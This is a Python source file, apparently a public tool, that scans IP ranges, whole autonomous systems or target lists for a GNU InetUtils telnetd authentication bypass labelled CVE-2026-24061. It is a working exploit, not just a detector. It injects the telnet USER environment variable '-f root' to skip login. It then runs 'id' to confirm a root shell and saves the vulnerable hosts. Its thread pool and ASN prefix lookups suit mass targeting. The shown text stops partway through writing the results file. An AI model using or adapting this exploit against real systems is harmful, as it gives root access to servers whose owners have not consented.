#!/usr/bin/env python3
# Made with ✨ Magic ©️ Nur Mukhammad Agus (https://github.com/madfxr), 2026. Free and Open Source Software (FOSS)

import argparse
import concurrent.futures
import ipaddress
import json
import logging
import re
import socket
import sys
import threading
import time
import urllib.request
import urllib.error
from dataclasses import dataclass
from typing import List, Optional, Sequence, Set, Tuple

# Telnet protocol constants
IAC = 255
DONT = 254
DO = 253
WONT = 252
WILL = 251
SB = 250
SE = 240

# ANSI Color Codes
# ANSI Color Codes
class LogColors:
    RESET = '\033[0m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'


class ColoredFormatter(logging.Formatter):
    """Custom formatter with colored level names only."""

    COLORS = {
        'DEBUG': '\033[94m',      # Blue
        'INFO': '\033[92m',        # Green
        'WARNING': '\033[93m',     # Yellow
        'ERROR': '\033[91m',       # Red
        'CRITICAL': '\033[91m',    # Red
    }

    RESET = '\033[0m'

    def format(self, record):
        # Format timestamp (plain, no color)
        timestamp = self.formatTime(record, self.datefmt)

        # Get levelname dengan warna
        levelname = record.levelname
        if levelname in self.COLORS:
            colored_level = f"{self.COLORS[levelname]}{levelname}{self.RESET}"
        else:
            colored_level = levelname

        # Get message dan pastikan tidak ada ANSI codes tersembunyi
        message = str(record.getMessage())

        # Build dengan explicit reset sebelum message
        return f"{timestamp} {colored_level} {self.RESET}{message}"


# Telnet options
ECHO = 1
SUPPRESS_GO_AHEAD = 3
ENVIRON = 36
NEW_ENVIRON = 39

# NEW-ENVIRON subnegotiation
ENV_IS = 0
ENV_SEND = 1
ENV_VAR = 0
ENV_VALUE = 1
ENV_ESC = 2
ENV_USERVAR = 3

ENV_OPTIONS: Set[int] = {ENVIRON, NEW_ENVIRON}
CLIENT_WILL_OPTIONS: Set[int] = ENV_OPTIONS | {SUPPRESS_GO_AHEAD}
SERVER_WILL_OPTIONS: Set[int] = {ECHO, SUPPRESS_GO_AHEAD}

LOGIN_PROMPT_RE = re.compile(r"^(login|username|password)\s*:?\s*$", re.IGNORECASE)


def normalize_text(text: str) -> str:
    """Normalize line endings."""
    return text.replace("\r\n", "\n").replace("\r", "\n")


def has_login_prompt(text: str) -> bool:
    """Check if text contains login prompt."""
    for line in normalize_text(text).splitlines():
        stripped = line.strip()
        if not stripped:
            continue
        lower = stripped.lower()
        if lower.startswith("last login"):
            continue
        if LOGIN_PROMPT_RE.match(stripped):
            return True
        if lower.endswith("login:") and not lower.startswith("last login"):
            return True
        if lower.endswith("password:") and not lower.startswith("last password"):
            return True
        if lower.endswith("username:"):
            return True
    return False


def has_root_id(text: str) -> bool:
    """Check if text contains uid=0 and gid=0."""
    lower = text.lower()
    return "uid=0" in lower and "gid=0" in lower


def escape_env_data(data: bytes) -> bytes:
    """Escape special bytes in environment data."""
    escaped = bytearray()
    for byte in data:
        if byte in (ENV_VAR, ENV_VALUE, ENV_ESC, ENV_USERVAR, IAC):
            escaped.append(ENV_ESC)
        escaped.append(byte)
    return bytes(escaped)


def build_env_payload(option: int, name: str, value: str) -> bytes:
    """Build NEW-ENVIRON Subnegotiation Payload."""
    name_bytes = escape_env_data(name.encode("ascii", errors="ignore"))
    value_bytes = escape_env_data(value.encode("ascii", errors="ignore"))
    payload = bytearray([IAC, SB, option, ENV_IS, ENV_VAR])
    payload += name_bytes
    payload.append(ENV_VALUE)
    payload += value_bytes
    payload += bytes([IAC, SE])
    return bytes(payload)


def fetch_asn_prefixes(asn: str, logger: logging.Logger) -> List[str]:
    """Fetch IP Prefixes for a Given ASN Using Multiple Sources."""
    asn_clean = asn.upper().replace("AS", "").strip()
    prefixes: Set[str] = set()

    try:
        logger.info("Querying RADB for AS%s...", asn_clean)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(10)
            s.connect(('whois.radb.net', 43))
            s.sendall(f"-i origin AS{asn_clean}\n".encode())
            result = ''
            while True:
                data = s.recv(4096).decode('utf-8', errors='ignore')
                if not data:
                    break
                result += data

            for line in result.split('\n'):
                if line.startswith('route:'):
                    prefix = line.split(':', 1)[1].strip()
                    if prefix and '/' in prefix:
                        try:
                            ipaddress.ip_network(prefix)
                            prefixes.add(prefix)
                        except ValueError:
                            continue
                elif line.startswith('route6:'):
                    prefix = line.split(':', 1)[1].strip()
                    if prefix and '/' in prefix:
                        try:
                            ipaddress.ip_network(prefix)
                            prefixes.add(prefix)
                        except ValueError:
                            continue

        logger.info("Found %d Prefixes from RADB", len(prefixes))
    except Exception as exc:
        logger.warning("RADB Query Failed: %s", exc)

    if not prefixes:
        try:
            logger.info("Querying BGPView API for AS%s...", asn_clean)
            url = f"https://api.bgpview.io/asn/{asn_clean}/prefixes"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Twenty-Three-Scanner/1.0')

            with urllib.request.urlopen(req, timeout=15) as response:
                data = json.loads(response.read().decode())

                if data.get('status') == 'ok':
                    ipv4_prefixes = data.get('data', {}).get('ipv4_prefixes', [])
                    ipv6_prefixes = data.get('data', {}).get('ipv6_prefixes', [])

                    for item in ipv4_prefixes:
                        prefix = item.get('prefix')
                        if prefix:
                            prefixes.add(prefix)

                    for item in ipv6_prefixes:
                        prefix = item.get('prefix')
                        if prefix:
                            prefixes.add(prefix)

                    logger.info("Found %d Prefixes from BGPView", len(prefixes))
        except Exception as exc:
            logger.warning("BGPView API Query Failed: %s", exc)

    if not prefixes:
        try:
            logger.info("Querying HackerTarget for AS%s...", asn_clean)
            url = f"https://api.hackertarget.com/aslookup/?q=AS{asn_clean}"
            req = urllib.request.Request(url)
            req.add_header('User-Agent', 'Twenty-Three-Scanner/1.0')

            with urllib.request.urlopen(req, timeout=15) as response:
                result = response.read().decode('utf-8', errors='ignore')

                for line in result.split('\n'):
                    line = line.strip()
                    if '/' in line:
                        parts = line.split(',')
                        if parts:
                            prefix = parts[0].strip()
                            try:
                                ipaddress.ip_network(prefix)
                                prefixes.add(prefix)
                            except ValueError:
                                continue

                logger.info("Found %d Prefixes from HackerTarget", len(prefixes))
        except Exception as exc:
            logger.warning("HackerTarget Query Failed: %s", exc)

    return sorted(list(prefixes))


class TelnetNegotiator:
    """Handle Telnet protocol negotiation."""

    def __init__(self, sock: socket.socket, user_value: str, logger: logging.Logger) -> None:
        self.sock = sock
        self.user_value = user_value
        self.logger = logger
        self._buffer = bytearray()
        self._env_sent: Set[int] = set()
        self._send_requested: Set[int] = set()

    def send_cmd(self, cmd: int, opt: int) -> None:
        self.sock.sendall(bytes([IAC, cmd, opt]))
        self.logger.debug("Sent IAC %d %d", cmd, opt)

    def send_env(self, option: int) -> None:
        if option in self._env_sent:
            return
        payload = build_env_payload(option, "USER", self.user_value)
        self.sock.sendall(payload)
        self._env_sent.add(option)
        self.logger.debug("Sent ENV USER=%s using option %d", self.user_value, option)

    def env_sent(self, option: int) -> bool:
        return option in self._env_sent

    def send_requested(self, option: int) -> bool:
        return option in self._send_requested

    def read_text(self, timeout: float) -> str:
        end = time.monotonic() + timeout
        chunks: List[bytes] = []
        while time.monotonic() < end:
            remaining = end - time.monotonic()
            if remaining <= 0:
                break
            self.sock.settimeout(remaining)
            try:
                data = self.sock.recv(4096)
            except socket.timeout:
                break
            if not data:
                break
            cleaned = self.feed(data)
            if cleaned:
                chunks.append(cleaned)
        if not chunks:
            return ""
        return normalize_text(b"".join(chunks).decode("utf-8", errors="ignore"))

    def feed(self, data: bytes) -> bytes:
        self._buffer.extend(data)
        out = bytearray()
        i = 0
        while i < len(self._buffer):
            byte = self._buffer[i]
            if byte != IAC:
                out.append(byte)
                i += 1
                continue
            if i + 1 >= len(self._buffer):
                break
            cmd = self._buffer[i + 1]
            if cmd == IAC:
                out.append(IAC)
                i += 2
                continue
            if cmd in (DO, DONT, WILL, WONT):
                if i + 2 >= len(self._buffer):
                    break
                opt = self._buffer[i + 2]
                self._handle_command(cmd, opt)
                i += 3
                continue
            if cmd == SB:
                end = self._find_iac_se(i + 2)
                if end is None:
                    break
                if i + 2 >= len(self._buffer):
                    break
                opt = self._buffer[i + 2]
                data_start = i + 3
                data = bytes(self._buffer[data_start:end]) if data_start <= end else b""
                data = self._unescape_iac(data)
                self._handle_subnegotiation(opt, data)
                i = end + 2
                continue
            i += 2
        del self._buffer[:i]
        return bytes(out)

    def _unescape_iac(self, data: bytes) -> bytes:
        if IAC not in data:
            return data
        unescaped = bytearray()
        i = 0
        while i < len(data):
            byte = data[i]
            if byte == IAC and i + 1 < len(data) and data[i + 1] == IAC:
                unescaped.append(IAC)
                i += 2
                continue
            unescaped.append(byte)
            i += 1
        return bytes(unescaped)

    def _parse_env_send_vars(self, data: bytes) -> List[str]:
        names: List[str] = []
        current: Optional[bytearray] = None
        i = 0
        while i < len(data):
            byte = data[i]
            if byte == ENV_ESC:
                i += 1
                if i >= len(data):
                    break
                if current is not None:
                    current.append(data[i])
                i += 1
                continue
            if byte in (ENV_VAR, ENV_USERVAR):
                if current is not None and current:
                    names.append(current.decode("ascii", errors="ignore"))
                current = bytearray()
                i += 1
                continue
            if current is not None:
                current.append(byte)
            i += 1
        if current is not None and current:
            names.append(current.decode("ascii", errors="ignore"))
        return names

    def _handle_subnegotiation(self, opt: int, data: bytes) -> None:
        if opt not in ENV_OPTIONS:
            self.logger.debug("Ignoring SB option %d", opt)
            return
        if not data:
            self.logger.debug("Empty SB data for option %d", opt)
            return
        command = data[0]
        if command != ENV_SEND:
            self.logger.debug("Ignoring SB option %d command %d", opt, command)
            return
        requested = self._parse_env_send_vars(data[1:])
        wants_user = not requested or any(name.upper() == "USER" for name in requested)
        if wants_user:
            self._send_requested.add(opt)
            self.send_env(opt)

    def _find_iac_se(self, start: int) -> Optional[int]:
        i = start
        while i < len(self._buffer) - 1:
            if self._buffer[i] == IAC:
                if self._buffer[i + 1] == SE:
                    return i
                if self._buffer[i + 1] == IAC:
                    i += 2
                    continue
            i += 1
        return None

    def _handle_command(self, cmd: int, opt: int) -> None:
        if cmd == DO:
            if opt in CLIENT_WILL_OPTIONS:
                self.send_cmd(WILL, opt)
                if opt in ENV_OPTIONS and opt != NEW_ENVIRON:
                    self.send_env(opt)
            else:
                self.send_cmd(WONT, opt)
        elif cmd == WILL:
            if opt in SERVER_WILL_OPTIONS:
                self.send_cmd(DO, opt)
            else:
                self.send_cmd(DONT, opt)


@dataclass
class ScanConfig:
    connect_timeout: float
    read_timeout: float
    id_timeout: float
    user_value: str


@dataclass
class ScanResult:
    host: str
    port: int
    vulnerable: bool = False
    evidence: str = ""
    error: str = ""


def parse_ports(port_value: str) -> List[int]:
    """Parse comma-separated port list into integers."""
    ports: List[int] = []
    for part in port_value.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            port = int(part)
        except ValueError as exc:
            raise argparse.ArgumentTypeError(f"Unauthorized Port: {part}") from exc
        if port < 1 or port > 65535:
            raise argparse.ArgumentTypeError(f"Port Out of Range: {port}")
        ports.append(port)
    if not ports:
        raise argparse.ArgumentTypeError("No Valid Ports Provided")
    return ports


def split_target_tokens(value: str) -> List[str]:
    return [token.strip() for token in value.replace(",", " ").split() if token.strip()]


def read_targets_file(path: str) -> List[str]:
    tokens: List[str] = []
    with open(path, "r", encoding="utf-8") as handle:
        for line in handle:
            line = line.split("#", 1)[0].strip()
            if not line:
                continue
            tokens.extend(split_target_tokens(line))
    return tokens


def expand_targets(
    raw_tokens: Sequence[str],
    logger: logging.Logger,
    max_hosts_per_cidr: int = 1024,
    skip_large: bool = False
) -> List[str]:
    targets: List[str] = []
    seen: Set[str] = set()
    total_skipped = 0
    large_networks_skipped = 0

    for token in raw_tokens:
        if "/" in token:
            try:
                network = ipaddress.ip_network(token, strict=False)
            except ValueError:
                logger.warning("Skipping Invalid CIDR: %s", token)
                continue

            if skip_large and network.prefixlen < 16:
                logger.warning("Skipping Large Network: %s", token)
                large_networks_skipped += 1
                continue

            num_hosts = network.num_addresses
            if network.version == 4:
                num_hosts -= 2

            if num_hosts > max_hosts_per_cidr:
                logger.warning("CIDR %s Has %d Hosts, Limiting to %d", token, num_hosts, max_hosts_per_cidr)
                total_skipped += (num_hosts - max_hosts_per_cidr)

            count = 0
            for ip in network.hosts():
                if count >= max_hosts_per_cidr:
                    break
                ip_str = str(ip)
                if ip_str not in seen:
                    seen.add(ip_str)
                    targets.append(ip_str)
                    count += 1
            continue

        try:
            ip = ipaddress.ip_address(token)
        except ValueError:
            logger.warning("Skipping Invalid Target: %s", token)
            continue
        ip_str = str(ip)
        if ip_str not in seen:
            seen.add(ip_str)
            targets.append(ip_str)

    if total_skipped > 0:
        logger.warning("Limited %d Hosts Due to CIDR Size Limits", total_skipped)
    if large_networks_skipped > 0:
        logger.warning("Skipped %d Large Networks", large_networks_skipped)

    return targets


def scan_target(
    host: str,
    port: int,
    config: ScanConfig,
    logger: logging.Logger,
) -> ScanResult:
    result = ScanResult(host=host, port=port)
    try:
        with socket.create_connection((host, port), timeout=config.connect_timeout) as sock:
            sock.settimeout(config.read_timeout)
            negotiator = TelnetNegotiator(sock, config.user_value, logger)

            negotiator.send_cmd(WILL, NEW_ENVIRON)
            negotiator.send_cmd(WILL, ENVIRON)

            text = negotiator.read_text(config.read_timeout)
            if not negotiator.send_requested(NEW_ENVIRON):
                text += negotiator.read_text(0.3)
            if not negotiator.env_sent(NEW_ENVIRON):
                negotiator.send_env(NEW_ENVIRON)

            text += negotiator.read_text(config.read_timeout)
            if has_login_prompt(text):
                result.evidence = "login prompt"
                return result

            sock.sendall(b"\r\n")
            text += negotiator.read_text(config.read_timeout)
            if has_login_prompt(text):
                result.evidence = "login prompt"
                return result

            sock.sendall(b"id\r\n")
            id_text = negotiator.read_text(config.id_timeout)
            if has_login_prompt(text + id_text):
                result.evidence = "login prompt"
                return result

            if has_root_id(id_text):
                result.vulnerable = True
                result.evidence = "uid=0/gid=0"
            return result
    except (socket.timeout, ConnectionRefusedError) as exc:
        result.error = str(exc)
        return result
    except OSError as exc:
        result.error = str(exc)
        return result


def setup_logging(verbose: bool) -> logging.Logger:
    level = logging.DEBUG if verbose else logging.INFO

    # Simple formatter tanpa warna
    logging.basicConfig(
        level=level,
        format="%(asctime)s %(levelname)s %(message)s",
        datefmt="%H:%M:%S",
    )

    return logging.getLogger("twenty_three_scanner")


def create_compact_header(asn: str = None, targets: int = 0, ports: str = "", threads: int = 50) -> str:
    width = 79
    lines = []

    lines.append("┌" + "─" * (width - 2) + "┐")

    title = "TWENTY-THREE SCANNER v1.0"
    padding_left = (width - 4 - len(title)) // 2
    padding_right = width - 4 - len(title) - padding_left
    lines.append("│ " + " " * padding_left + title + " " * padding_right + " │")

    subtitle = "CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass"
    padding_left = (width - 4 - len(subtitle)) // 2
    padding_right = width - 4 - len(subtitle) - padding_left
    lines.append("│ " + " " * padding_left + subtitle + " " * padding_right + " │")

    lines.append("├" + "─" * (width - 2) + "┤")

    if asn:
        asn_str = f"ASN: {asn}"
        padding = width - 4 - len(asn_str)
        lines.append(f"│ {asn_str}" + " " * padding + " │")

    targets_str = f"Targets: {targets:,} IPs"
    padding = width - 4 - len(targets_str)
    lines.append(f"│ {targets_str}" + " " * padding + " │")

    ports_str = f"Ports: {ports}"
    padding = width - 4 - len(ports_str)
    lines.append(f"│ {ports_str}" + " " * padding + " │")

    threads_str = f"Threads: {threads}"
    padding = width - 4 - len(threads_str)
    lines.append(f"│ {threads_str}" + " " * padding + " │")

    lines.append("└" + "─" * (width - 2) + "┘")

    return "\n".join(lines)



def create_combined_progress_box(
    completed: int,
    total: int,
    rate: float,
    eta: float,
    vulnerable_count: int,
    last_vulnerable_host: str = None,
    last_vulnerable_port: int = None,
    last_vulnerable_time: str = None
) -> str:
    """Create combined box with scanning progress."""
    width = 79
    lines = []

    lines.append("┌" + "─" * (width - 2) + "┐")

    # Title tetap "SCANNING IN PROGRESS"
    title = "SCANNING IN PROGRESS"
    padding_left = (width - 4 - len(title)) // 2
    padding_right = width - 4 - len(title) - padding_left
    lines.append("│ " + " " * padding_left + title + " " * padding_right + " │")

    lines.append("├" + "─" * (width - 2) + "┤")

    # Time (last vulnerable or N/A)
    if last_vulnerable_time:
        time_str = f"Timestamp:: {last_vulnerable_time}"
    else:
        time_str = "Timestamp:: N/A"
    padding = width - 4 - len(time_str)
    lines.append(f"│ {time_str}" + " " * padding + " │")

    # IP Address (last vulnerable or N/A)
    if last_vulnerable_host:
        ip_str = f"IP Address: {last_vulnerable_host}"
    else:
        ip_str = "IP Address: N/A"
    padding = width - 4 - len(ip_str)
    lines.append(f"│ {ip_str}" + " " * padding + " │")

    # Port (last vulnerable or N/A)
    if last_vulnerable_port:
        port_str = f"Port: {last_vulnerable_port}"
    else:
        port_str = "Port: N/A"
    padding = width - 4 - len(port_str)
    lines.append(f"│ {port_str}" + " " * padding + " │")

    # Endpoints
    endpoints_str = f"Endpoints: {completed:,}/{total:,}"
    padding = width - 4 - len(endpoints_str)
    lines.append(f"│ {endpoints_str}" + " " * padding + " │")

    # Scan Rate
    rate_str = f"Scan Rate: {rate:.1f}/s"
    padding = width - 4 - len(rate_str)
    lines.append(f"│ {rate_str}" + " " * padding + " │")

    # ETA
    eta_str = f"ETA: {int(eta)}s"
    padding = width - 4 - len(eta_str)
    lines.append(f"│ {eta_str}" + " " * padding + " │")

    # Vulnerable Found
    vuln_str = f"Vulnerable Found: {vulnerable_count}"
    padding = width - 4 - len(vuln_str)
    lines.append(f"│ {vuln_str}" + " " * padding + " │")

    # Progress bar - FIXED WIDTH
    progress_pct = (completed / total * 100) if total > 0 else 0

    # Calculate available space: width(79) - borders(4) - "Progress: " (10) - " ]" (2) - " 100.0%" (7) = 56
    bar_width = 56
    filled = int(bar_width * completed / total) if total > 0 else 0
    filled = min(filled, bar_width)
    bar = "█" * filled + "░" * (bar_width - filled)

    # Build progress line with exact spacing
    progress_line = f"Progress: [{bar}] {progress_pct:5.1f}%"

    # Ensure exact width
    content_length = len(progress_line)
    padding = (width - 4) - content_length
    if padding < 0:
        padding = 0

    lines.append(f"│ {progress_line}" + " " * padding + " │")

    lines.append("└" + "─" * (width - 2) + "┘")

    return "\n".join(lines)



def create_final_compact_table(vulnerable: List[ScanResult], elapsed: float, total: int, scanned: int, interrupted: bool = False) -> str:
    width = 79

    lines = []
    lines.append("┌" + "─" * (width - 2) + "┐")

    title = "SCANNING INTERRUPTED" if interrupted else "SCANNING COMPLETED"
    padding_left = (width - 4 - len(title)) // 2
    padding_right = width - 4 - len(title) - padding_left
    lines.append("│ " + " " * padding_left + title + " " * padding_right + " │")

    lines.append("├" + "─" * (width - 2) + "┤")

    rate = scanned / elapsed if elapsed > 0 else 0

    # Duration
    dur_str = f"Duration: {elapsed:.1f}s"
    padding = (width - 4) - len(dur_str)
    lines.append(f"│ {dur_str}" + " " * padding + " │")

    # Total Scanned
    pct = (scanned / total * 100) if total > 0 else 0
    if interrupted:
        scan_str = f"Scanned: {scanned:,}/{total:,} Endpoints ({pct:.1f}%)"
    else:
        scan_str = f"Total Scanned: {scanned:,} Endpoints ({pct:.1f}%)"
    padding = (width - 4) - len(scan_str)
    lines.append(f"│ {scan_str}" + " " * padding + " │")

    # Scan Rate
    rate_str = f"Scan Rate: {rate:.1f}/sec"
    padding = (width - 4) - len(rate_str)
    lines.append(f"│ {rate_str}" + " " * padding + " │")

    # Result
    vuln_label = "VULNERABLE" if vulnerable else "NO VULNERABLE HOSTS"
    vuln_str = f"Result: {len(vulnerable)} {vuln_label}"
    padding = (width - 4) - len(vuln_str)
    lines.append(f"│ {vuln_str}" + " " * padding + " │")

    if not vulnerable:
        lines.append("└" + "─" * (width - 2) + "┘")
        return "\n".join(lines)

    lines.append("├" + "─" * (width - 2) + "┤")

    # ALL VULNERABLE HOSTS - centered
    vuln_title = "ALL VULNERABLE HOSTS"
    content_width = width - 4  # 75
    padding_left = (content_width - len(vuln_title)) // 2
    padding_right = content_width - len(vuln_title) - padding_left
    lines.append("│ " + " " * padding_left + vuln_title + " " * padding_right + " │")

    # Table dengan total content width = 75
    # Kolom widths: # (5) + Host (29) + Port (10) + Evidence (31) = 75
    lines.append("├─────┬─────────────────────────────┬──────────┬──────────────────────────────┤")
    lines.append("│   # │ Host                        │   Port   │ Evidence                     │")
    lines.append("├─────┼─────────────────────────────┼──────────┼──────────────────────────────┤")

    # Table rows
    for idx, result in enumerate(vulnerable, 1):
        evidence = result.evidence[:29] + ".." if len(result.evidence) > 31 else result.evidence
        lines.append(f"│ {idx:>3} │ {result.host:<27} │ {result.port:>8} │ {evidence:<29}│")

    lines.append("└─────┴─────────────────────────────┴──────────┴──────────────────────────────┘")

    return "\n".join(lines)


def scan_with_basic_compact(
    endpoints: List[Tuple[str, int]],
    config: ScanConfig,
    logger: logging.Logger,
    args: argparse.Namespace,
    vulnerable: List[ScanResult]
) -> Tuple[bool, int]:
    """Scan with basic compact display. Returns (completed_successfully, scanned_count)."""

    completed = 0
    start_time = time.time()
    total = len(endpoints)
    interrupted = False
    last_time_update = time.time()
    time_interval = 0.5

    # Track last vulnerable
    last_vuln_host = None
    last_vuln_port = None
    last_vuln_time = None

    # Print header
    print(create_compact_header(
        asn=args.asn if hasattr(args, 'asn') and args.asn else None,
        targets=len(set(h for h, p in endpoints)),
        ports=args.port,
        threads=args.threads
    ))
    print()

    # Box always has 12 lines (fixed size)
    box_lines = 12

    # Print initial box
    print(create_combined_progress_box(0, total, 0, 0, 0))

    executor = concurrent.futures.ThreadPoolExecutor(
        max_workers=args.threads,
        thread_name_prefix="scanner"
    )

    for thread in threading.enumerate():
        if thread.name.startswith("scanner"):
            thread.daemon = True

    try:
        futures = {
            executor.submit(scan_target, host, port, config, logger): (host, port)
            for host, port in endpoints
        }

        for future in concurrent.futures.as_completed(futures):
            try:
                result = future.result()
                completed += 1
                current_time = time.time()

                elapsed = current_time - start_time
                rate = completed / elapsed if elapsed > 0 else 0
                eta = (total - completed) / rate if rate > 0 else 0

                if result.vulnerable:
                    vulnerable.append(result)
                    last_vuln_host = result.host
                    last_vuln_port = result.port
                    last_vuln_time = time.strftime("%H:%M:%S")

                    # Update box with vulnerable info
                    sys.stdout.write(f"\033[{box_lines}A")  # Move up
                    print(create_combined_progress_box(
                        completed, total, rate, eta, len(vulnerable),
                        last_vuln_host, last_vuln_port, last_vuln_time
                    ))
                    sys.stdout.flush()
                    last_time_update = current_time
                    continue

                # Periodic update
                if current_time - last_time_update >= time_interval or completed == total:
                    sys.stdout.write(f"\033[{box_lines}A")  # Move up
                    print(create_combined_progress_box(
                        completed, total, rate, eta, len(vulnerable),
                        last_vuln_host, last_vuln_port, last_vuln_time
                    ))
                    sys.stdout.flush()
                    last_time_update = current_time

            except Exception as exc:
                logger.debug("Error Processing Result: %s", exc)

    except KeyboardInterrupt:
        interrupted = True
        # Clear ^C character sebelum print message
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()
        print("\n")
        logger.info("Scanning Interrupted by User (Ctrl+C)")


    finally:
        executor.shutdown(wait=False, cancel_futures=True)

    # Final spacing
    print()

    return (not interrupted, completed)



def parse_args(argv: Sequence[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="python3 twenty-three-scanner.py",
        description="CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Scan specific ASN with multiple ports
  %(prog)s -a AS10111 -p 23,2323 --threads 100
  %(prog)s -a 10111 -p 23,2323 --threads 100

  # Scan CIDR range
  %(prog)s -t 192.168.23.0/24 -p 23 -o results.txt

  # Scan multiple IPs
  %(prog)s -t 10.0.0.1,10.0.0.2,10.0.0.3 -p 23,2323

  # Scan from file
  %(prog)s -f targets.txt -p 23 --threads 50 -o output.txt

  # Scan ASN with custom limits
  %(prog)s -a AS10111 --max-hosts-per-cidr 2048 --threads 200

For more information: https://github.com/madfxr/Twenty-Three-Scanner
        """
    )

    target_group = parser.add_argument_group('Target Options')
    target_group.add_argument(
        "-t", "--target",
        action="append",
        metavar="TARGET",
        help="target IP, CIDR, or comma-separated list (can be used multiple times)"
    )
    target_group.add_argument(
        "-f", "--file",
        metavar="FILE",
        help="file containing targets (one per line, supports comments with #)"
    )
    target_group.add_argument(
        "-a", "--asn",
        metavar="ASN",
        help="autonomous system number (e.g., AS10111 or 10111)"
    )

    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument(
        "-p", "--port",
        default="23",
        metavar="PORT",
        help="target port(s), comma-separated (default: 23)"
    )
    scan_group.add_argument(
        "--threads",
        type=int,
        default=50,
        metavar="N",
        help="number of concurrent threads (default: 50)"
    )
    scan_group.add_argument(
        "--user-value",
        default="-f root",
        metavar="VALUE",
        help="USER environment variable value for exploit (default: '-f root')"
    )

    timeout_group = parser.add_argument_group('Timeout Options')
    timeout_group.add_argument(
        "--connect-timeout",
        type=float,
        default=3.0,
        metavar="SEC",
        help="TCP connection timeout in seconds (default: 3.0)"
    )
    timeout_group.add_argument(
        "--read-timeout",
        type=float,
        default=2.0,
        metavar="SEC",
        help="socket read timeout in seconds (default: 2.0)"
    )
    timeout_group.add_argument(
        "--id-timeout",
        type=float,
        default=2.0,
        metavar="SEC",
        help="'id' command response timeout in seconds (default: 2.0)"
    )

    limit_group = parser.add_argument_group('Limit Options')
    limit_group.add_argument(
        "--max-hosts-per-cidr",
        type=int,
        default=1024,
        metavar="N",
        help="maximum hosts to scan per CIDR block (default: 1024)"
    )
    limit_group.add_argument(
        "--max-total-hosts",
        type=int,
        default=50000,
        metavar="N",
        help="maximum total hosts across all targets (default: 50000)"
    )
    limit_group.add_argument(
        "--skip-large-networks",
        action="store_true",
        help="skip networks larger than /16 (avoids accidentally scanning huge ranges)"
    )

    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument(
        "-o", "--output",
        metavar="FILE",
        help="save vulnerable hosts to file (format: IP:PORT)"
    )
    output_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="enable verbose debug logging"
    )

    return parser.parse_args(argv)


def build_endpoints(targets: Sequence[str], ports: Sequence[int]) -> List[Tuple[str, int]]:
    endpoints: List[Tuple[str, int]] = []
    for host in targets:
        for port in ports:
            endpoints.append((host, port))
    return endpoints


def main(argv: Sequence[str]) -> int:
    args = parse_args(argv)
    logger = setup_logging(args.verbose)

    import signal
    ctrl_c_count = [0]

    def handle_interrupt(sig, frame):
        ctrl_c_count[0] += 1
        if ctrl_c_count[0] == 1:
            raise KeyboardInterrupt
        else:
            sys.stderr.write("\r\033[K")
            sys.stderr.flush()

            handler = logging.StreamHandler(sys.stderr)
            formatter = ColoredFormatter(
                fmt='%(asctime)s %(levelname)s %(message)s',
                datefmt='%H:%M:%S'
            )
            handler.setFormatter(formatter)

            temp_logger = logging.getLogger('interrupt')
            temp_logger.setLevel(logging.WARNING)
            temp_logger.handlers = [handler]
            temp_logger.warning("Scanning Force Interrupted by User (CTRL+C)")


    signal.signal(signal.SIGINT, handle_interrupt)

    logger.warning("Using Basic Display Mode")

    try:
        ports = parse_ports(args.port)
    except argparse.ArgumentTypeError as exc:
        # Hardcode tanpa color codes
        error_msg = str(exc)
        timestamp = time.strftime("%H:%M:%S")
        sys.stderr.write(f"{timestamp} \033[91mERROR\033[0m {error_msg}\n")
        sys.stderr.flush()
        return 2


    logger.info("Parsed Ports: %s", ",".join(map(str, ports)))

    raw_tokens: List[str] = []

    if args.asn:
        logger.info("Fetching Prefixes for ASN: %s", args.asn)
        asn_prefixes = fetch_asn_prefixes(args.asn, logger)
        if not asn_prefixes:
            logger.error("Not Found Prefixes for ASN: %s", args.asn)
            return 2
        logger.info("Found %d Prefixes for %s", len(asn_prefixes), args.asn)
        raw_tokens.extend(asn_prefixes)

    if args.target:
        for value in args.target:
            raw_tokens.extend(split_target_tokens(value))

    if args.file:
        try:
            raw_tokens.extend(read_targets_file(args.file))
        except OSError as exc:
            logger.error("Failed to Read Targets File: %s", exc)
            return 2

    if not raw_tokens:
        logger.error("No Targets Specified. Use --target, --file, or --asn.")
        return 2

    logger.info("Expanding %d Target Token(s)...", len(raw_tokens))
    targets = expand_targets(
        raw_tokens,
        logger,
        max_hosts_per_cidr=args.max_hosts_per_cidr,
        skip_large=args.skip_large_networks
    )

    if not targets:
        logger.error("No Valid Targets After Expansion.")
        return 2

    if len(targets) > args.max_total_hosts:
        logger.warning("Limiting to First %d Hosts", args.max_total_hosts)
        targets = targets[:args.max_total_hosts]

    endpoints = build_endpoints(targets, ports)
    logger.info("Ready to Scan %d Endpoint(s)\n", len(endpoints))

    config = ScanConfig(
        connect_timeout=args.connect_timeout,
        read_timeout=args.read_timeout,
        id_timeout=args.id_timeout,
        user_value=args.user_value,
    )

    vulnerable: List[ScanResult] = []
    start_time = time.time()

    try:
        completed_successfully, scanned_count = scan_with_basic_compact(endpoints, config, logger, args, vulnerable)
    except KeyboardInterrupt:
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()
        logger.warning("Force Exit During Cleanup")
        return 130

    elapsed = time.time() - start_time

    try:
        print(create_final_compact_table(vulnerable, elapsed, len(endpoints), scanned_count, not completed_successfully))
        print()
    except KeyboardInterrupt:
        sys.stderr.write("\r\033[K")
        sys.stderr.flush()
        return 130

    if args.output and vulnerable:
        try:
            with open(args.output, 'w', encoding='utf-8') as f:
                f.write(f"# CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass Scan Results\n")
                f.write(f"# Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total Planned: {len(endpoints)} Endpoints\n")
                f.write(f"# Total Scanned: {scanned_count} Endpoints\n")
                f.write(f"# Vulnerable Found: {len(vulnerable)}\n")
                if not completed_successfully:
                    f.write(f"# Status: INTERRUPTED\n")
